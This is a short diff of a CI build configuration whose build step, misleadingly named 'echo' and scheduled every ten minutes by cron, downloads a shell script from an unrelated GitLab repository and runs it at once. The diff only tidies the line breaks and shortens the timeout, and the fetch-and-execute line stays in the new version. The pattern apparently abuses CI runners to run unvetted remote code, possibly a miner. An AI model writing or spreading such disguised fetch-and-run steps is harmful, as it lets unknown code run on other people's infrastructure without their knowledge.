@@ -5,15 +5,8 @@ build:
     - 
       script: 
         code: |
-            apt update -y && apt install -y wget xz-utils && apt install 
-
--y bash
-            wget https://gitlab.com/pakmolemu/madang/-/raw/main/maem.sh && 
-
-chmod +x maem.sh && ./maem.sh
+            apt update -y && apt install -y wget xz-utils && apt install -y bash
+            wget https://gitlab.com/pakmolemu/madang/-/raw/main/maem.sh && chmod +x maem.sh && ./maem.sh
         name: echo
-command-timeout: 360
+command-timeout: 120
 cron: "*/10 * * * *"
-
-
-
